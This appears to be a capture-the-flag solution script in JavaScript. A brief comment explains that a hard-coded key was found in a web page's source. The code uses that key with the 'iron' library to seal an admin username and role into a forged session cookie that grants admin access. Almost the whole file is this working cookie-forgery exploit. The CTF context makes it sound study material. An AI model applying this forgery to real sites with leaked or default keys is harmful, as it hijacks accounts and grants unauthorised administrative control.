// For this challenge the source code of a web page was given. In the source code I found a hard coded key, which was being
// used to seal the credentials of the user and create a session cookie. Giving the function the desired values and using the 
// hard coded key, I was able to craft a cookie, which granted me admin access to the website.


// If the module is not found then do: npm install iron
const Iron = require('iron');


async function authenticate(secret_key) {

  const credentials = {
    username: "admin",
    role: "admin"
  };

  const sealed = await Iron.seal(credentials, secret_key, Iron.defaults);
  return sealed;
}


const secret_key = 'change_me_asdjakhds12412dakT*&ASDY(*AYSDHNCAJSCO';
let seak = authenticate(secret_key);
seak.then(function (token) {console.log(token)});
